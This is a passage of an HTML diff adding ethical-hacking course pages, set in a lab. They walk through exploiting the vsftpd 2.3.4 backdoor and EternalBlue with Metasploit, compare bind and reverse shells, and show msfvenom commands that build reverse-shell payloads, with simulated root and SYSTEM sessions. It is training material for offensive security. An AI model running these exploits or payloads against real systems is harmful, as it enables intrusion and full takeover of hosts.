+        <div class="dgm-detail" data-detail="m5"><h5><span class="dd-tag">AUXILIARY</span>No payload needed</h5><p><b>Scanners and tools that do not pop a shell</b> &mdash; port scans, login brute-force, the MS17-010 <em>check</em>. <span class="mono">auxiliary/scanner/smb/smb_ms17_010</span> tells you if EternalBlue will work before you fire it.</p></div>
+        <div class="dgm-detail" data-detail="m6"><h5><span class="dd-tag">POST</span>After the foothold</h5><p><b>Modules that run through an existing session</b> &mdash; harvest creds, pivot, enumerate. This is mostly Session 6 (post-exploitation); today you just meet the category.</p></div>
+      </figure>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">msfconsole &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>The console front-end to the Metasploit Framework &mdash; a searchable library of exploits, payloads, auxiliary and post modules with a common <span class="mono">use / set / run</span> workflow.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To make reliable, tested exploits repeatable &mdash; so you spend your thinking on <em>which</em> attack and <em>what user you land as</em>, not on re-implementing a PoC each time.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td><span class="mono">search</span> the vuln &rarr; <span class="mono">use</span> the module &rarr; <span class="mono">show options</span> &rarr; <span class="mono">set</span> the required ones &rarr; <span class="mono">check</span> (if supported) &rarr; <span class="mono">exploit</span>. Pick your payload deliberately &mdash; it decides what comes back.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>msfconsole -q
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.56.107
+set LHOST 192.168.56.101
+exploit          # or: run</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><span class="mono">[+] ... - The target is vulnerable.</span> then <span class="mono">[*] Meterpreter session 1 opened</span>. No session = a required option is blank, the payload could not connect back, or the target is patched.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>A session &rarr; the foothold record &rarr; Session 6&#39;s privilege escalation.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Loud.</span> The exploit itself, the new child process, and the reverse connection all generate events (4688 / Sysmon 1 &amp; 3). EternalBlue in particular is flagged by IDS and EDR in near-real-time &mdash; you will write that rule in Lab 9.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; search and inspect a module (no firing)</span><pre><code>msfconsole -q
+search type:exploit vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options     # note: RHOSTS is the only required option</code></pre><p style="margin-top:8px"><b>You should see:</b> the module loads and <span class="mono">show options</span> lists <span class="mono">RHOSTS</span> as required &mdash; the whole of Lab 1, wrapped in one module. Lab 2 fires it.</p></div>
+      <div class="box note"><span class="box-t">The honest line about the framework</span><p>Metasploit automates steps 4&ndash;6 of the pipeline brilliantly. It does <strong>not</strong> automate step 3 &mdash; understanding the exploit &mdash; and it does not teach you what to do when a module fails. That is why we did Lab 1 by hand first, and why the exam and real engagements still test manual exploitation.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 2: manual vs framework">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P07</span><span class="tag lab">Hands-on · everyone · compare</span><span class="time">&#9201; 12 min</span></div>
+      <h1>Lab 2 &mdash; The Same Exploit, via Metasploit</h1>
+      <p class="lede">Fire the vsftpd backdoor again &mdash; this time through Metasploit &mdash; and name exactly what the framework did for you.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why do it twice</span><p>You already rooted Metasploitable2 by hand in Lab 1. Now you do the identical exploit in three lines of Metasploit. The point is not the shell &mdash; you have it already &mdash; the point is to <strong>see what the framework automated</strong> and what it did not.</p></div><ol class="steps">
+<li>
+<strong>Run the module.</strong>
+<pre><code>msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+exploit</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">msf6 exploit(vsftpd_234_backdoor)</span><span class="sim-tool">metasploit</span></div>
+  <div class="sim-body">
+<span class="l cmd">set RHOSTS 192.168.56.102</span>
+<span class="l cmd">exploit</span>
+<span class="l dim">[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="l dim">[*] 192.168.56.102:21 - USER: 331 Please specify the password.</span>
+<span class="l ok">[+] 192.168.56.102:6200 - Backdoor service has been spawned, handling...</span>
+<span class="l ok">[*] Command shell session 1 opened (192.168.56.101 -> 192.168.56.102:6200)</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=0(root) gid=0(root)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>Three lines</b> for the whole of Lab 1. The framework did steps 4&ndash;6 &mdash; not step 3.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">[+] ... Backdoor service has been spawned</span> then a <span class="mono">Command shell session 1 opened</span></li></ul></div>
+</li>
+<li>
+<strong>Interact and record.</strong>
+<pre><code>sessions -l
+sessions -i 1
+id ; hostname</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">sessions -l</span> shows session 1</li><li>Foothold record row matches Lab 1 (root on MSF2) &mdash; via Metasploit this time</li></ul></div>
+</li>
+</ol>      <h2><span class="h-t">What the framework did &mdash; and did not</span></h2>
+      <div class="split">
+        <div class="box defender-view"><span class="box-t">Automated for you</span><p>Opened the connection, sent the poisoned username, spawned and <strong>caught the shell on 6200</strong>, and managed the session &mdash; steps 4, 5 and 6. It also picked a compatible payload automatically.</p></div>
+        <div class="box warn"><span class="box-t">Still on you</span><p><strong>Step 3</strong> &mdash; knowing what the exploit does and that it is safe to run here. And when a module says <span class="mono">Exploit completed, but no session was created</span>, Metasploit will not tell you <em>why</em>. That is your job.</p></div>
+      </div>
+      <div class="box key-takeaway"><span class="box-t">The takeaway to write down</span><p><strong class="hl">Manual proves you understand it; the framework proves you can do it at speed.</strong> An engagement wants both &mdash; and the exam tests the manual one precisely because the framework hides it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="EternalBlue chain">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P08</span><span class="tag theory">Method · the worked chain</span><span class="time">&#9201; 7 min</span></div>
+      <h1>EternalBlue &mdash; One CVE, End to End</h1>
+      <p class="lede">The cleanest CVE&rarr;exploit&rarr;SYSTEM demonstration in the course &mdash; and the exact MS17-010 you matched against Windows 7 in Session 4.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is the flagship example</span><p>In Session 4 you ran <span class="mono">nmap --script smb-vuln-ms17-010</span> and it came back <em>vulnerable</em>. You wrote &quot;public exploit: yes&quot; in the access plan. This is that exploit &mdash; the NSA-developed SMBv1 flaw leaked in 2017 &mdash; taken all the way to a <strong>SYSTEM</strong> shell, the highest privilege on Windows. One CVE, the whole pipeline, in one diagram.</p></div>      <figure class="dgm pktflow"><figure class="dgm pktflow">
+          <svg viewBox="0 0 940 424" role="img" aria-label="EternalBlue worked chain from Kali to the Windows 7 target: verify with the auxiliary check, configure the exploit, fire it, the SMBv1 kernel is corrupted, a SYSTEM shell returns, and the SOC sees the events.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">Kali &middot; msfconsole</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">attacker</text>
+          <line x1="185" y1="80" x2="185" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="630" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="54" text-anchor="middle" font-size="14" fill="var(--green)">WIN7-TGT01</text>
+          <text class="d-sub" x="755" y="70" text-anchor="middle">SMBv1 on, unpatched</text>
+          <line x1="755" y1="80" x2="755" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="470" y="106" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">1 &middot; auxiliary check: is MS17-010 present?</text>
+          <path d="M191,120 L749,120" fill="none" stroke="var(--cyan)" stroke-width="2" marker-end="url(#ar-c)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--text-3)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">configure: set RHOSTS win7 &middot; set LHOST kali &middot; payload x64 meterpreter</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">2 &middot; exploit &rarr; crafted SMBv1 packets</text>
+          <path d="M191,228 L749,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">SMBv1 kernel pool corrupted &rarr; shellcode runs as NT AUTHORITY\SYSTEM</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:26px">
+          <text x="470" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">3 &middot; meterpreter session &rarr; SYSTEM</text>
+          <path d="M749,336 L191,336" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="6" style="--pf-dx:-26px">
+          <rect x="245" y="368" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="388" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">SOC sees: IDS hit (ET EXPLOIT MS17-010) &middot; new process &middot; egress callback</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span><span class="mono">auxiliary/scanner/smb/smb_ms17_010</span> confirms the target is vulnerable <b>before</b> you fire &mdash; the same finding as your S4 nmap script.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Point the module at the victim and set your callback. The default payload is a staged x64 meterpreter reverse_tcp.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The exploit sends malformed SMBv1 packets that corrupt kernel memory &mdash; code execution in the context of the SMB service, which runs as SYSTEM.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>This is the RCE. Because it lands in the kernel/SMB context, you skip straight to the highest privilege &mdash; no escalation needed.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>A session opens. <span class="mono">getuid</span> = <b>NT AUTHORITY\SYSTEM</b>. Foothold record: via EternalBlue, payload staged meterpreter, landed as SYSTEM.</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>EternalBlue is one of the most heavily signatured exploits in existence &mdash; Suricata/Snort flag it instantly. You will read this evidence in Lab 9.</div>
+        </figure>        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; re-confirm the target is vulnerable (safe, no exploit)</span><pre><code>msfconsole -q
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.107
+run     # =&gt; [+] Host is likely VULNERABLE to MS17-010!</code></pre><p style="margin-top:8px"><b>You should see:</b> <span class="mono">[+] Host is likely VULNERABLE to MS17-010!</span> &mdash; the green light to fire in Lab 3. If it says <em>not</em> vulnerable, the box is patched or SMBv1 is off; revert to the <span class="mono">pre-s5</span> snapshot.</p></div><div class="box warn"><span class="box-t">Why we target Windows 7 (and the honest currency note)</span><p>MS17-010 is <strong>patched on every supported Windows</strong> since March 2017. WIN7-TGT01 is a deliberately unpatched, SMBv1-on lab box &mdash; a teaching target, not a picture of a modern network. The lesson that <em>does</em> travel: an internet-facing unpatched service is still exactly this dangerous, which is why patch management is the countermeasure.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 3: EternalBlue">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P09</span><span class="tag lab">Hands-on · everyone · the flagship</span><span class="time">&#9201; 15 min</span></div>
+      <h1>Lab 3 &mdash; EternalBlue to a SYSTEM Shell</h1>
+      <p class="lede">Take the S4 match to the highest privilege on Windows. This is the exploit every CEH remembers.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Fire MS17-010 at WIN7-TGT01 and land a <strong>SYSTEM</strong> meterpreter session. You will confirm the user context, prove code execution, and save the evidence the SOC will later use to catch you.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Target: <span class="mono">WIN7-TGT01 &middot; 192.168.56.107</span>, your own unpatched host-only VM. Take a <span class="mono">pre-s5</span> snapshot first &mdash; EternalBlue can bluescreen the target, and a revert is faster than a rebuild.</p></div><ol class="steps">
+<li>
+<strong>Verify, then fire.</strong>
+<pre><code>msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.107
+set LHOST 192.168.56.101
+check        # [+] The target is vulnerable.
+exploit</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">msf6 exploit(ms17_010_eternalblue)</span><span class="sim-tool">metasploit</span></div>
+  <div class="sim-body">
+<span class="l cmd">exploit</span>
+<span class="l dim">[*] Started reverse TCP handler on 192.168.56.101:4444</span>
+<span class="l dim">[*] 192.168.56.107:445 - Connecting to target for exploitation.</span>
+<span class="l ok">[+] 192.168.56.107:445 - The target is vulnerable.</span>
+<span class="l dim">[*] 192.168.56.107:445 - Sending SMBv1 buffer...</span>
+<span class="l ok">[+] 192.168.56.107:445 - =-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
+<span class="l ok">[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.107:49158)</span>
+<span class="l cmd root">meterpreter > getuid</span>
+<span class="l ok">Server username: NT AUTHORITY\SYSTEM</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>-=WIN=-</b> is the exploit&#39;s success banner. <span class="mono">getuid</span> = SYSTEM &mdash; no privesc needed.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">[+] The target is vulnerable.</span></li><li>A <span class="mono">Meterpreter session 1 opened</span> after the WIN found</li></ul></div>
+</li>
+<li>
+<strong>Prove execution and record the context.</strong>
+<pre><code>meterpreter > getuid        # NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+meterpreter > shell
+C:\> whoami                  # nt authority\system</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">getuid</span> = <strong>NT AUTHORITY\SYSTEM</strong></li><li>Foothold record: host=WIN7, via=EternalBlue (MS17-010), payload=staged meterpreter, <strong>landed as SYSTEM</strong></li></ul></div>
+</li>
+<li>
+<strong>Save the evidence for Lab 9</strong> (you will detect this attack later).
+<pre><code># on the monitored Win7 / Sysmon host, export the Security + Sysmon logs around the exploit time
+# fallback provided: saved/lab3_eternalblue_sysmon.evtx</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have the process-creation + network evidence saved (or the fallback) for the detection lab</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>A <strong>SYSTEM</strong> shell from a single matched CVE &mdash; the cleanest offense-to-impact demo in the diploma. And because you landed as SYSTEM, Session 6&#39;s privilege escalation on this host is already done: the lesson there becomes <em>when you land low, how do you get here?</em></p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Bind vs reverse">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P10</span><span class="tag theory">Method · why reverse wins</span><span class="time">&#9201; 8 min</span></div>
+      <h1>Bind vs Reverse &mdash; the One Image That Explains Shells</h1>
+      <p class="lede">Two ways a shell connects. One is blocked by every firewall; the other walks straight out. Step through both.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this decides whether your exploit even connects</span><p>Your exploit lands and runs a payload &mdash; but a shell is a <em>connection</em>, and connections have a direction. Get the direction wrong and the firewall silently eats your shell and you think the exploit failed. This one distinction explains 90% of &quot;it worked in the lab but not on the engagement.&quot;</p></div>      <figure class="dgm pktflow"><figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Bind versus reverse shell: a bind shell has the attacker connect inbound to a port the target opened, which the firewall blocks; a reverse shell has the target connect outbound to the attacker, which the firewall allows.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">Attacker</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">your Kali</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="630" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="54" text-anchor="middle" font-size="14" fill="var(--green)">Target</text>
+          <text class="d-sub" x="755" y="70" text-anchor="middle">behind a firewall</text>
+          <line x1="755" y1="80" x2="755" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--text-3)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">BIND SHELL &mdash; the target opens a listening port</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">attacker connects IN to target:4444</text>
+          <path d="M191,174 L749,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">&#128683; firewall DROPS inbound &mdash; bind shell fails</text>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="470" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">REVERSE SHELL &mdash; target connects OUT to you</text>
+          <path d="M749,282 L191,282" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">&#10003; firewall ALLOWS outbound &mdash; reverse shell connects</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The payload opens e.g. <span class="mono">4444</span> on the target and waits. Simple &mdash; but something has to reach <em>in</em> to use it.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>You try to connect inbound to the target&#39;s port. On any real network an inbound firewall rule sits in the way.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Almost every host and network blocks unsolicited <b>inbound</b> connections. The bind shell dies here. This is the deliberate failure in Lab 4.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Flip the direction: the payload makes the <em>target</em> dial back to your waiting listener &mdash; usually on <span class="mono">443</span> or <span class="mono">53</span> to blend in.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>Outbound traffic is normally permitted (users browse the web). The reverse shell rides that trust straight out. <b>This is why reverse wins.</b></div>
+        </figure>        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see the direction in one line each (concept)</span><pre><code># BIND  : victim opens a port, attacker dials in
+nc -lvnp 4444        # (this runs ON the victim in a bind payload)
+# REVERSE: attacker opens the port, victim dials out
+nc -lvnp 443         # (this runs ON YOUR kali; the victim connects back)</code></pre><p style="margin-top:8px"><b>You should see:</b> the only difference is <b>who runs the listener</b>. In a reverse shell your Kali listens and the target connects to you &mdash; which is the setup for Lab 4 and Lab 5.</p></div><div class="box key-takeaway"><span class="box-t">The rule</span><p><strong class="hl hl-d">Reverse shells beat firewalls because firewalls fear what comes IN, not what goes OUT.</strong> Default to reverse; reach for bind only when the target cannot make outbound connections but you can reach it inbound (rare, but it happens on flat internal networks).</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 4: bind vs reverse">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P11</span><span class="tag lab">Hands-on · everyone · the failure teaches</span><span class="time">&#9201; 12 min</span></div>
+      <h1>Lab 4 &mdash; Watch the Bind Shell Die</h1>
+      <p class="lede">Run both shell types against the same host. The bind shell gets blocked; the reverse shell walks out. The failure is the lesson.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>You will start a bind shell on a target behind its host firewall and fail to reach it &mdash; then flip to a reverse shell and succeed. Feeling the bind shell fail is worth more than being told it would.</p></div><ol class="steps">
+<li>
+<strong>Bind shell &mdash; and its failure.</strong> Generate a bind payload, run it on the target (firewall on), and try to connect in.
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
+# run bind.exe on WIN10-TGT01 (Defender/firewall ON)
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/bind_tcp
+set RHOST 192.168.56.108
+set LPORT 4444
+run        # =&gt; hangs / times out — the firewall drops your inbound connection</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The handler <strong>cannot connect</strong> &mdash; it hangs or times out. That is the firewall, not a mistake</li></ul></div>
+</li>
+<li>
+<strong>Reverse shell &mdash; the same box, opposite direction.</strong>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o rev.exe
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.101
+set LPORT 443
+run        # now WAIT — run rev.exe on the target</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">msf6 exploit(multi/handler)</span><span class="sim-tool">reverse_tcp handler</span></div>
+  <div class="sim-body">
+<span class="l cmd">run</span>
+<span class="l dim">[*] Started reverse TCP handler on 192.168.56.101:443</span>
+<span class="l warn">[*] (waiting — target must execute rev.exe)</span>
+<span class="l ok">[*] Sending stage (201798 bytes) to 192.168.56.108</span>
+<span class="l ok">[*] Meterpreter session 1 opened (192.168.56.101:443 -> 192.168.56.108:51422)</span>
+<span class="l cmd root">getuid</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>Port 443</b> &mdash; the reverse shell hides in what looks like normal HTTPS egress.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">[*] Meterpreter session 1 opened</span> the moment the target runs the payload &mdash; the outbound connection was allowed</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you proved</span><p>The <strong>same target</strong>, the <strong>same tool</strong>, opposite results &mdash; decided only by connection direction. You will never again wonder why an exploit &quot;worked but gave no shell.&quot; Default to reverse.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Staged vs stageless">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P12</span><span class="tag theory">Method · payloads</span><span class="time">&#9201; 9 min</span></div>
+      <h1>Payloads: Staged vs Stageless, and msfvenom</h1>
+      <p class="lede">Two ways to deliver the same shell. One is small and fetches the rest; one is whole and self-contained. The <span class="mono">/</span> in the payload name tells you which.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why one character changes everything</span><p><span class="mono">windows/x64/meterpreter<b>/</b>reverse_tcp</span> vs <span class="mono">windows/x64/meterpreter<b>_</b>reverse_tcp</span>. A slash means <strong>staged</strong>; an underscore means <strong>stageless</strong>. That one character decides your payload&#39;s size, its reliability, and whether your handler must stay up &mdash; so you need to read it.</p></div>      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 170" role="img" aria-label="Staged payload sends a small stager that downloads the full payload in two steps; stageless sends the entire payload in one step. Click each.">
+          <g class="node" data-node="st" tabindex="0">
+            <rect x="20" y="30" width="410" height="112" rx="10" fill="#1a1f2a" stroke="#22d3ee"/>
+            <text class="d-title" x="225" y="56" text-anchor="middle" font-size="13">STAGED &mdash; slash (/)</text>
+            <text class="d-sub" x="225" y="80" text-anchor="middle">1) tiny stager runs on target</text>
+            <text class="d-sub" x="225" y="100" text-anchor="middle">2) stager pulls the full payload from you</text>
+            <text class="d-sub" x="225" y="122" text-anchor="middle" class="d-mono" fill="#22d3ee">small file, needs the handler up</text>
+          </g>
+          <g class="node" data-node="sl" tabindex="0">
+            <rect x="510" y="30" width="410" height="112" rx="10" fill="#1a1f2a" stroke="#a78bfa"/>
+            <text class="d-title" x="715" y="56" text-anchor="middle" font-size="13" fill="#a78bfa">STAGELESS &mdash; underscore (_)</text>
+            <text class="d-sub" x="715" y="80" text-anchor="middle">whole payload delivered at once</text>
+            <text class="d-sub" x="715" y="100" text-anchor="middle">nothing to fetch afterwards</text>
+            <text class="d-sub" x="715" y="122" text-anchor="middle" class="d-mono" fill="#a78bfa">bigger file, more reliable</text>
+          </g>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; when to reach for it.</div>
+        <div class="dgm-detail" data-detail="st"><h5><span class="dd-tag">STAGED</span>Small stager, fetches the rest</h5><p><b>A tiny first-stage runs, connects back, and downloads the real payload (the &quot;stage&quot;) from your handler.</b> Smaller file (fits tight buffers &mdash; useful in exploits and BOFs), but the handler <em>must</em> be listening at the moment of connection or the stage never arrives. <span class="mono">windows/x64/meterpreter<b>/</b>reverse_tcp</span>. <span class="mono">multi/handler</span> serves the stage automatically.</p></div>
+        <div class="dgm-detail" data-detail="sl"><h5><span class="dd-tag">STAGELESS</span>Whole payload, one shot</h5><p><b>The entire payload is delivered at once</b> &mdash; nothing to download afterwards. Bigger file, but more reliable over flaky links and simpler to catch with a plain <span class="mono">nc</span>. <span class="mono">windows/x64/meterpreter<b>_</b>reverse_tcp</span>. Reach for it when the connection is unreliable or you cannot guarantee stage delivery.</p></div>
+      </figure>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">msfvenom &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>The Metasploit payload generator &mdash; it builds a standalone payload (exe, elf, php, raw shellcode&hellip;) you deliver <em>outside</em> a Metasploit exploit and catch with a handler.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To weaponise a payload for any delivery: a file the user runs, a web upload, shellcode for a buffer overflow. When you cannot use a full exploit module, you still need the shell.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Choose payload (<span class="mono">-p</span>) &rarr; set <span class="mono">LHOST</span>/<span class="mono">LPORT</span> &rarr; choose a format (<span class="mono">-f</span>) &rarr; write it out. Then catch it with <span class="mono">multi/handler</span> set to the <em>same</em> payload.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.101 LPORT=443 -f exe -o rev.exe
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.56.101 LPORT=443 -f elf -o rev.elf
+msfvenom -p php/reverse_php LHOST=... LPORT=... -f raw -o sh.php
+msfvenom --list payloads | grep meterpreter</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><span class="mono">Payload size: 201798 bytes</span> &mdash; note staged payloads are small, stageless large. <span class="mono">Saved as: rev.exe</span>. Wrong <span class="mono">-f</span> for the target = a file that will not run.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>A payload file + a <span class="mono">multi/handler</span> waiting to catch it &mdash; Lab 5. And shellcode (<span class="mono">-f c</span>) for the buffer overflow in Lab 8.</td></tr>
